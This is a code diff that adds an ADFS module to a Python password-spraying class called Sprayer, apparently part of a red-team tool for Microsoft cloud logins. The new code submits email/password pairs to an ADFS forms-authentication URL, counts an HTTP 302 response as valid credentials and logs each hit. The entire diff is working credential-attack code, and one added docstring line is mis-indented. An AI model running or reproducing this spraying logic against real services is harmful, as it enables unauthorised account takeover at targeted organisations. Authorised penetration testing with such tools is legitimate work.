@@ -41,7 +41,8 @@ class Sprayer:
         self._modules = {
             'autodiscover': self._autodiscover,
             'activesync':   self._activesync,
-            'msol':         self._msol
+            'msol':         self._msol,
+            'adfs':         self._adfs
         }
 
 
@@ -245,6 +246,38 @@ class Sprayer:
 
                 else:
                     print("[%sINVALID%s]\t\t%s:%s%s" % (text_colors.red, text_colors.reset, email, password, self.helper.space), end='\r')
+
+        except Exception as e:
+            if self.args.debug: print("\n[ERROR]\t\t\t%s" % e)
+            pass
+
+
+   """ Spray users via a managed ADFS server """
+    # https://github.com/Mr-Un1k0d3r/RedTeamScripts/blob/master/adfs-spray.py
+    def _adfs(self, user, password):
+        try:
+            headers = Config.headers  # Grab external headers from config.py
+
+            # Build email if not already built
+            email = self.helper.check_email(user, self.args.domain)
+
+            # Keep track of tested names in case we ctrl-c
+            self.tested_creds.append('%s:%s' % (email, password))
+
+            time.sleep(0.250)
+
+            data     = "UserName=%s&Password=%s&AuthMethod=FormsAuthentication" % (email, password)
+            url      = self.args.adfs
+            response = self._send_request(requests.post, url, data=data, headers=headers)
+            status   = response.status_code
+
+            if status == 302:
+                print("[%sVALID_CREDS%s]\t\t%s:%s%s" % (text_colors.green, text_colors.reset, email, password, self.helper.space))
+                self.valid_creds.append('%s:%s' % (email, password))
+                self.userlist.remove(user)  # Remove valid user from being sprayed again
+
+            else:
+                print("[%sINVALID%s]\t\t%s:%s%s" % (text_colors.red, text_colors.reset, email, password, self.helper.space), end='\r')
 
         except Exception as e:
             if self.args.debug: print("\n[ERROR]\t\t\t%s" % e)
